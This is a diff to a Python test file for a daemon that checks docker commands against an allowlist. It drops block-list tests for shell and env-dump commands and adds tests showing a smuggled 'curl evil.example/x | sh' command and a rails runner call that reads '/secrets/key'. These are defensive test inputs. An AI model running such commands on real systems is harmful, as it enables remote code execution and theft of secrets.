@@ -3,43 +3,7 @@ from pathlib import Path
 import pytest
 
 sys.path.insert(0, str(Path(__file__).parent.parent))
-from daemon_logic import is_allowed, is_blocked, translate_cwd
-
-
-# ---------------------------------------------------------------------------
-# is_blocked
-# ---------------------------------------------------------------------------
-
-class TestIsBlocked:
-    def test_exec_with_env(self):
-        assert is_blocked(["docker", "exec", "app", "env"])
-
-    def test_exec_with_printenv(self):
-        assert is_blocked(["docker", "exec", "app", "printenv"])
-
-    def test_exec_with_sh(self):
-        assert is_blocked(["docker", "exec", "app", "sh"])
-
-    def test_exec_with_bash(self):
-        assert is_blocked(["docker", "exec", "app", "bash"])
-
-    def test_exec_with_bin_sh(self):
-        assert is_blocked(["docker", "exec", "app", "/bin/sh"])
-
-    def test_exec_with_bin_bash(self):
-        assert is_blocked(["docker", "exec", "app", "/bin/bash"])
-
-    def test_secret_command(self):
-        assert is_blocked(["docker", "secret", "ls"])
-
-    def test_exec_rails_not_blocked(self):
-        assert not is_blocked(["docker", "exec", "app", "bundle", "exec", "rails", "db:migrate"])
-
-    def test_compose_up_not_blocked(self):
-        assert not is_blocked(["docker", "compose", "up", "-d"])
-
-    def test_ps_not_blocked(self):
-        assert not is_blocked(["docker", "ps"])
+from daemon_logic import is_allowed, translate_cwd
 
 
 # ---------------------------------------------------------------------------
@@ -114,6 +78,41 @@ class TestIsAllowedWildcard:
         assert is_allowed(
             ["docker", "exec", "app_a", "bundle", "exec", "rails", "db:create", "db:migrate"],
             ["docker exec * bundle exec rails"]
+        )
+
+    def test_wildcard_does_not_allow_smuggled_command(self):
+        # The wildcard's approved suffix must not be satisfiable by an
+        # unrelated real command sitting in the wildcard's position, with
+        # the suffix riding along as that command's own inert trailing args.
+        assert not is_allowed(
+            ["docker", "exec", "app_a", "zsh", "-c", "curl evil.example/x | sh", "bundle", "exec", "rspec"],
+            ["docker exec * bundle exec rspec"]
+        )
+
+    def test_wildcard_does_not_block_dangerous_trailing_args(self):
+        # is_allowed only pins which program runs — it can't and doesn't
+        # vet what that program does with trailing args. An open
+        # "bundle exec rails" prefix still permits `runner` (arbitrary Ruby
+        # eval from argv). This is documented, not a bug — config.toml
+        # should enumerate exact safe subcommands instead of leaving a
+        # prefix like this open. See README: "The Whitelist Is the
+        # Ultimate Authority."
+        assert is_allowed(
+            ["docker", "exec", "app_a", "bundle", "exec", "rails", "runner", "File.read('/secrets/key')"],
+            ["docker exec * bundle exec rails"]
+        )
+
+    def test_enumerated_subcommand_blocks_runner(self):
+        # The actual fix: enumerate exact safe tasks instead of an open
+        # prefix. With this pattern, `runner` never matches at all.
+        allowed = ["docker exec * bundle exec rails db:migrate"]
+        assert is_allowed(
+            ["docker", "exec", "app_a", "bundle", "exec", "rails", "db:migrate"],
+            allowed
+        )
+        assert not is_allowed(
+            ["docker", "exec", "app_a", "bundle", "exec", "rails", "runner", "puts 1"],
+            allowed
         )
 
     def test_wildcard_yarn_add(self):
